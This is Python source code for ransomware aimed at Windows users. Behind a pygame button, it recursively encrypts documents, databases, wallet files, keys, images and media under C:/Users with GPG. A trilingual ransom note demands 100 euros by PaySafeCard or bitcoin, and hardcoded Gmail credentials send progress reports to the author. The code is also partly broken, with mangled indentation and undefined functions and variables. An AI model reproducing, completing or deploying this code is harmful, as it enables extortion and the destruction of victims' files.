import os
import sys
import subprocess
import random
import string
import re
from pyDes import des
import glob
import os.path
import gnupg
import pdb
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText


import pygame
from pygame.locals import *
import pygame_textinput

def Windows():
    path=('C:')
    text1=('C:/Users/*')
    text2=('C:/*')
    verif=""
    textexe='ejecutado'
    textfin='fin users'
    textall='fin all'
    s = string.ascii_lowercase + string.digits
    pwd = str(''.join(random.sample(s, 8)))
    t=string.ascii_lowercase
    idd =str(''.join(random.sample(s, 10)))

    #inicialisamos pygame
    pygame.init()
    pygame.font.init()

    #creation fenetre vide
    fenetre = pygame.display.set_mode((640, 480))

    #Chargement et collage du fond
    fond = pygame.image.load("background.jpg").convert()

    #chargement button
    image = pygame.image.load('button.png')
    image = pygame.transform.scale(image, (200, 100))
    image_rect = image.get_rect()
    image_rect.topleft = (230,360)

    #chargement fond texte
    image2 = pygame.image.load('text.jpg')
    image2 = pygame.transform.scale(image2, (400, 35))
    image2_rect = image2.get_rect()
    image2_rect.topleft = (135,320)

    #Input
    text_color=(255, 255, 255)
    font_size=10
    antialias=True

    textI = pygame_textinput.TextInput()
    textI.text_color=text_color

    #BOUCLE INFINIE
    continuer = 1

    #Boucle infinie
        while continuer:
	if aff==0:
		events = pygame.event.get()
		fenetre.blit(image2, image2_rect)
		fenetre.blit(textI.get_surface(), (138, 325))
		textI.update(events)
		pygame.display.flip()
    		pygame.display.update()

    	for event in events:
        	if event.type == pygame.QUIT:
            		exit()

		elif event.type == MOUSEBUTTONUP:              
                	if event.button == 1:                      
                    		if image_rect.collidepoint(event.pos):
					mail(textexe)
    					crypt(text1, pwd, path, bitcoin, price,verif)
    					mail(textfin)
					#crypt(text2, pwd, path, bitcoin, price,verif)
					#mail(textall)               
                        		nouveaufond = pygame.image.load("message.JPG").convert()
					nouveaufond = pygame.transform.scale(nouveaufond, (640, 480))
                        		fenetre.blit(nouveaufond, (0,0))
					aff=1
                        		pygame.display.flip()


bitcoin='18SXEt2zLcmYKCbZ6fx36QrmA2NuPAE9kq'
price='100 Euros'

def crypt(text, pwd, path, bitcoin, price,verif ):
    l= glob.glob(text)
    for i in l:
        if os.path.isdir(i):
            crypt(i+'/*',pwd, path,bitcoin, price,verif)
    for i in l:
        if os.path.splitext(i)[1]=='.PDF' or os.path.splitext(i)[1]=='.rss' or os.path.splitext(i)[1]=='.mp3' or os.path.splitext(i)[1]=='.msi' or os.path.splitext(i)[1]=='.DAT' or os.path.splitext(i)[1]=='.WALLET.dat' or os.path.splitext(i)[1]=='.dat' or os.path.splitext(i)[1]=='.wallet.dat' or os.path.splitext(i)[1]=='.asc' or os.path.splitext(i)[1]=='.key' or os.path.splitext(i)[1]=='.crt' or os.path.splitext(i)[1]=='.csr' or os.path.splitext(i)[1]=='.pem' or os.path.splitext(i)[1]=='.odt' or os.path.splitext(i)[1]=='.ott' or os.path.splitext(i)[1]=='.sxw' or os.path.splitext(i)[1]=='.stw' or os.path.splitext(i)[1]=='.ppt' or os.path.splitext(i)[1]=='.PPT' or os.path.splitext(i)[1]=='.RTF' or os.path.splitext(i)[1]=='.uot' or os.path.splitext(i)[1]=='.CSV' or os.path.splitext(i)[1]=='.max' or os.path.splitext(i)[1]=='.DOT' or os.path.splitext(i)[1]=='.dotx' or os.path.splitext(i)[1]=='.dotm' or os.path.splitext(i)[1]=='.hwp' or os.path.splitext(i)[1]=='.ods' or os.path.splitext(i)[1]=='.ots' or os.path.splitext(i)[1]=='.sxc' or os.path.splitext(i)[1]=='.stc' or os.path.splitext(i)[1]=='.dif' or os.path.splitext(i)[1]=='.xlc' or os.path.splitext(i)[1]=='.xlm' or os.path.splitext(i)[1]=='.xml' or os.path.splitext(i)[1]=='.xlt' or os.path.splitext(i)[1]=='.xlw' or os.path.splitext(i)[1]=='.slk' or os.path.splitext(i)[1]=='.xlsb' or os.path.splitext(i)[1]=='.xltm' or os.path.splitext(i)[1]=='.xltx' or os.path.splitext(i)[1]=='.wks' or os.path.splitext(i)[1]=='.odp' or os.path.splitext(i)[1]=='.opt' or os.path.splitext(i)[1]=='.sxi' or os.path.splitext(i)[1]=='.sti' or os.path.splitext(i)[1]=='.pps' or os.path.splitext(i)[1]=='.pot' or os.path.splitext(i)[1]=='.sxd' or os.path.splitext(i)[1]=='.std' or os.path.splitext(i)[1]=='.pptm' or os.path.splitext(i)[1]=='.pptx' or os.path.splitext(i)[1]=='.potm' or os.path.splitext(i)[1]=='.`potx' or os.path.splitext(i)[1]=='.uo' or os.path.splitext(i)[1]=='.odg' or os.path.splitext(i)[1]=='.otg' or os.path.splitext(i)[1]=='.sxm' or os.path.splitext(i)[1]=='.mml' or os.path.splitext(i)[1]=='.docb' or os.path.splitext(i)[1]=='.ppam' or os.path.splitext(i)[1]=='.ppsx' or os.path.splitext(i)[1]=='.ppsm' or os.path.splitext(i)[1]=='.sldx' or os.path.splitext(i)[1]=='.sldm' or os.path.splitext(i)[1]=='.ms11' or os.path.splitext(i)[1]=='.lay' or os.path.splitext(i)[1]=='.lay6' or os.path.splitext(i)[1]=='.asc' or os.path.splitext(i)[1]=='.SQLITE3' or os.path.splitext(i)[1]=='.SQLITEDB' or os.path.splitext(i)[1]=='.sql' or os.path.splitext(i)[1]=='.mdb' or os.path.splitext(i)[1]=='.dbf' or os.path.splitext(i)[1]=='.odb' or os.path.splitext(i)[1]=='.frm' or os.path.splitext(i)[1]=='.MYD' or os.path.splitext(i)[1]=='.MYI' or os.path.splitext(i)[1]=='.ibd' or os.path.splitext(i)[1]=='.mdf' or os.path.splitext(i)[1]=='.ldf' or os.path.splitext(i)[1]=='.cpp' or os.path.splitext(i)[1]=='.pas' or os.path.splitext(i)[1]=='.asm' or os.path.splitext(i)[1]=='.vbs' or os.path.splitext(i)[1]=='.dip' or os.path.splitext(i)[1]=='.dch' or os.path.splitext(i)[1]=='.sch' or os.path.splitext(i)[1]=='.brd' or os.path.splitext(i)[1]=='.java' or os.path.splitext(i)[1]=='.jar' or os.path.splitext(i)[1]=='.class' or os.path.splitext(i)[1]=='.bat' or os.path.splitext(i)[1]=='.cmd' or os.path.splitext(i)[1]=='.psd' or os.path.splitext(i)[1]=='.NEF' or os.path.splitext(i)[1]=='.tiff' or os.path.splitext(i)[1]=='.tif' or os.path.splitext(i)[1]=='.cgm' or os.path.splitext(i)[1]=='.raw' or os.path.splitext(i)[1]=='.gif' or os.path.splitext(i)[1]=='.svg' or os.path.splitext(i)[1]=='.djvu' or os.path.splitext(i)[1]=='.djv' or os.path.splitext(i)[1]=='.rar' or os.path.splitext(i)[1]=='.tgz' or os.path.splitext(i)[1]=='.tar' or os.path.splitext(i)[1]=='.bak' or os.path.splitext(i)[1]=='.tar.bz2' or os.path.splitext(i)[1]=='.PAQ' or os.path.splitext(i)[1]=='.aes' or os.path.splitext(i)[1]=='.gpg' or os.path.splitext(i)[1]=='.vmx' or os.path.splitext(i)[1]=='.vmdk' or os.path.splitext(i)[1]=='.vdi' or os.path.splitext(i)[1]=='.qcow2' or os.path.splitext(i)[1]=='.fla' or os.path.splitext(i)[1]=='.asf' or os.path.splitext(i)[1]=='.wma' or os.path.splitext(i)[1]=='.mid' or os.path.splitext(i)[1]=='.locky' or os.path.splitext(i)[1]=='.png' or os.path.splitext(i)[1]=='.jpeg' or os.path.splitext(i)[1]=='.xslx' or os.path.splitext(i)[1]=='.xls' or os.path.splitext(i)[1]=='.docm' or os.path.splitext(i)[1]=='.docx' or os.path.splitext(i)[1]=='.doc' or os.path.splitext(i)[1]=='.wmv' or os.path.splitext(i)[1]=='.vob' or os.path.splitext(i)[1]=='.swf' or os.path.splitext(i)[1]=='.mpeg' or os.path.splitext(i)[1]=='.mpg' or os.path.splitext(i)[1]=='.mp4' or os.path.splitext(i)[1]=='.mov' or os.path.splitext(i)[1]=='.mkv' or os.path.splitext(i)[1]=='.file' or os.path.splitext(i)[1]=='.eot' or os.path.splitext(i)[1]=='.js' or os.path.splitext(i)[1]=='.htm' or os.path.splitext(i)[1]=='.flv' or os.path.splitext(i)[1]=='.avi' or os.path.splitext(i)[1]=='.jsp' or os.path.splitext(i)[1]=='.asp' or os.path.splitext(i)[1]=='.php' or os.path.splitext(i)[1]=='.exe' or os.path.splitext(i)[1]=='.contact' or os.path.splitext(i)[1]=='.bmp' or os.path.splitext(i)[1]=='.rtf' or os.path.splitext(i)[1]=='.txt' or os.path.splitext(i)[1]=='.jpg' or os.path.splitext(i)[1]=='.zip' or os.path.splitext(i)[1]=='.pdf'or os.path.splitext(i)[1]=='.PNG':
            gpg = gnupg.GPG(gnupghome='new',gpgbinary="gnupg\\bin\\gpg.exe")
            try:
                lsvari= (i.split('\\'))
                if(lsvari.index("v2.23") >0):
                    pass
            except(ValueError):    
                input_data = gpg.gen_key_input(key_type="RSA",key_length=1024,passphrase=pwd)
                try:
                    archivo = open(i,"rb")
                    data = archivo.read()
                    datacifrada = gpg.encrypt(data, pwd)
                    archivo.close()
                    archivocifrado = open(i, "wb")
                    archivocifrado.write(datacifrada.data)
                    archivocifrado.close()
                except (IOError, RuntimeError, TypeError, NameError, OSError):
                    pass
    #howto(l)

def howto(l):

    archivo = open("ReadME.rtf","wb")
    archivo.write('hola te estaras preguntando que paso con tus archivos?\ntodos ellos fueron cifrados con RSA-2048\n')
    archivo.write('si los quieres recuperar debes abonar :' + str(price) +'\n')
    archivo.write("Puedes pagar con PaYSafeCard enviado los codigos de cupones al correo verybadtrip@protonmail.com \n")
    archivo.write("o enviar bitcoins a la direccion :#" + bitcoin+ "\n")
    archivo.write("indicar su numero de expediente: 158465542F \n")
    archivo.write("A continuacion te seran enviados la contraseña de desencrypcion y el manual explicativo para desencrypcion\n\n")
    archivo.write("Ten mas cuidado la proxima vez !!!\n \n")
    archivo.write('-------------------------------------------------------------- \n')
    archivo.write('Bonjour, Tu te demande surment ce qu´il c´est passé avec tes fichiers ?\nTout tes dossiers - fichiers ont été cryptés avec RSA-2048\n')
    archivo.write('si tu souhaite les recuperer tu doit payer :' + str(price) +'\n')
    archivo.write("Tu peut payer par PaySafeCard en envoyant directement le code coupons a l'adresse: verybadtrip@protonmail.com \n")
    archivo.write("ou par bitcoin a l´adresse suivante :#" + bitcoin+ "\n")
    archivo.write("Tu doit faire apparaitre ton nunmero de dossier: 158465542F \n")
    archivo.write("Le mot de passe de decryptage ainsi que le manuel de decryptage te seront par la suite envoyé \n\n")
    archivo.write("fait plus attention la prochaine fois !!!\n\n")
    archivo.write('-------------------------------------------------------------- \n')
    archivo.write('Hello, You wonder how it happened with your files? \nAll your files were encrypted with RSA-2048 \n ')
    archivo.write('if you want to retrieve them you have to pay:' + str (price) + '\n')
    archivo.write("You can pay by PaySafeCard by sending coupons directly to: verybadtrip@protonmail.com \n")
    archivo.write("or by bitcoin to the following address: #" + bitcoin + "\n")
    archivo.write("Enter your file number: 158465542F \ n")
    archivo.write("The decryption password and the decryption manual will be sent to you \n \n")
    archivo.write("be careful next time !!! \n")
    archivo.close()

    listnoRep=[" "]
    for i in l:
        vari= os.path.splitext(i)[0]
        vari4= (vari.split('\\'))
        vari5= (vari4[0].split('/'))
        if len(vari4)<5:
            try:
                copis="copy ReadME.rtf " +'"'+vari5[0]+'\\'+vari5[1]+'\\'+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'"'
                try:
                    control=listnoRep.index(copis)
                except (ValueError):
                    os.system(copis)
                    listnoRep.append(copis)
            except (IndexError):
                pass
            try:
                copis="copy ReadME.rtf " +'"'+vari5[0]+'\\'+vari5[1]+'\\'+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+'"'
                try:
                    control=listnoRep.index(copis)
                except (ValueError):
                    os.system(copis)
                    listnoRep.append(copis)
            except (IndexError):
                pass
            try:
                copis="copy ReadME.rtf " +'"'+vari5[0]+'\\'+vari5[1]+'\\'+vari4[1]+'\\'+vari4[2]+'\\'+'"'
                try:
                    control=listnoRep.index(copis)
                except (ValueError):
                    os.system(copis)
                    listnoRep.append(copis)
            except (IndexError):
                pass
            try:
                copis="copy ReadME.rtf " +'"'+vari5[0]+'\\'+vari5[1]+'\\'+vari4[1]+'\\'+'"'
                try:
                    control=listnoRep.index(copis)
                except (ValueError):
                    os.system(copis)
                    listnoRep.append(copis)
            except (IndexError):
                pass
def mail(text):
    msg = MIMEMultipart()
    msg['From'] = 'patatipatatabad@gmail.com'
    msg['To'] = 'patatipatatabad@gmail.com'
    msg['Subject'] = 'Hackthat' 
    message = text
    msg.attach(MIMEText(message))
    mailserver = smtplib.SMTP('smtp.gmail.com', 587)
    mailserver.ehlo()
    mailserver.starttls()
    mailserver.ehlo()
    mailserver.login('patatipatatabad@gmail.com', 'F011006f')
    mailserver.sendmail('patatipatatabad@gmail.com', 'patatipatatabad@gmail.com', msg.as_string())
    mailserver.quit()

if(sys.platform =='linux' or sys.platform == 'linux2'):
    linux()
else:
    Windows()
